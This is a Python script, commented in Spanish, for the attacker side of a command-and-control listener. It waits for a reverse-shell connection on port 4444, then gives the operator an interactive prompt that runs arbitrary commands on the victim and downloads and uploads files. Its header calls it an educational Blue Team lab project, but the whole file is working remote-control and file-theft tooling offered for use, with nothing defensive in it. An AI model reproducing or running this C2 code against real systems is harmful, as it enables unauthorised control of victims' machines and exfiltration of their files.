#!/usr/bin/env python3
# =============================================================================
# C2 SERVER - LADO DEL ATACANTE (Command & Control)
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# ENFOQUE: Transferencia de archivos de texto y configuración
# =============================================================================

import socket, os, time

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando Conexiones")
        self.connection, address = listener.accept()
        print("[+] Tenemos una conexion de " + str(address))
        
        conexion = self.connection.recv(1024)
        print(conexion.decode('utf-8', errors='ignore'))
        
        if not os.path.exists("descargados"):
            os.makedirs("descargados")
        
        if not os.path.exists("para_subir"):
            os.makedirs("para_subir")
            print("[+] Carpeta 'para_subir' creada para archivos a subir")
        
    def ejecutarRemoto(self, command):
        """
        Envía comando al reverse shell y recibe respuesta
        """
        self.connection.send(command.encode('utf-8'))
        return self.connection.recv(1024000)
    
    def uploadRemoto(self, local_path, remote_path):
        """
        Envía archivos de texto/configuración a la víctima
        """
        try:
            local_path = os.path.expanduser(local_path)
            
            with open(local_path, 'rb') as f:
                contenido = f.read()
            
            file_size = len(contenido)
            command = f"upload {remote_path} {file_size}"
            self.connection.send(command.encode('utf-8'))
            
            ack = self.connection.recv(1024)
            print(ack.decode('utf-8', errors='ignore').strip())
            
            time.sleep(0.1)
            self.connection.sendall(contenido)
            
            confirmacion = self.connection.recv(1024)
            return confirmacion.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"[!] Error: {str(e)}"
    
    def run(self):
        """
        Loop principal del C2
        Comandos disponibles: cd, download, upload, execute, salir, + comandos nativos
        """
        while True:
            command = input("shell »» ")
            
            if command == "salir":
                self.ejecutarRemoto(command)
                self.connection.close()
                exit()
            
            elif command.startswith("download "):
                self.connection.send(command.encode('utf-8'))
                
                header = self.connection.recv(1024)
                print(header.decode('utf-8', errors='ignore'))
                
                contenido = self.connection.recv(1024000)
                
                nombre_archivo = command.split(" ")[1].split("\\")[-1]
                ruta_guardado = f"descargados/{nombre_archivo}"
                
                with open(ruta_guardado, 'wb') as f:
                    f.write(contenido)
                
                print(f"[+] Archivo guardado en: {ruta_guardado}")
                continue
            
            elif command.startswith("upload "):
                partes = command.split(" ", 2)
                if len(partes) >= 3:
                    local_path = partes[1]
                    remote_path = partes[2]
                    resultado = self.uploadRemoto(local_path, remote_path)
                    print(resultado)
                continue
            
            else:
                result = self.ejecutarRemoto(command)
                print(result.decode('utf-8', errors='ignore'))

escuchar = Listener("192.168.1.33", 4444)
escuchar.run()